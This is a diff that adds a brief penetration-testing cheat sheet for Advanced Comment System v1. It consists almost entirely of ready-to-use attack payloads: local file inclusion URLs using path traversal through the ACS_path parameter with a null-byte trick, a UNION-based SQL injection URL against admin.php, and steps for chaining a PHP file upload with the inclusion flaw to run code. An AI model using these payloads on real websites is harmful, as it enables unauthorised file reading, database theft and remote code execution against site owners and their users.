@@ -1,0 +1,11 @@
+ACS v1 
+------
+LFI 
+www.site/path/advanced_comment_system/index.php?ACS_path=../../../juicy-file
+             /advanced_comment_system/admin.php?ACS_path=../../../juicy-file
+Add null byte to end of filename if result is a blank page (../../../juicy-file%00)
+---
+SQL Injection
+http://x.x.x.x/internal/advanced_comment_system/admin.php?pw=admin&page=/internal/index.php%27%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x71717a6b71,0x67424663534f77556d44746a59686f78427354754268636b5466486249616b724d716e4869634758,0x7171626a71),NULL--%20SkrU&del=2
+Check for user hashes, LFI and PHP file upload vulnerability
+  Upload file to tmp directory or web root and either use LFI to load from tmp or navigate to through web root
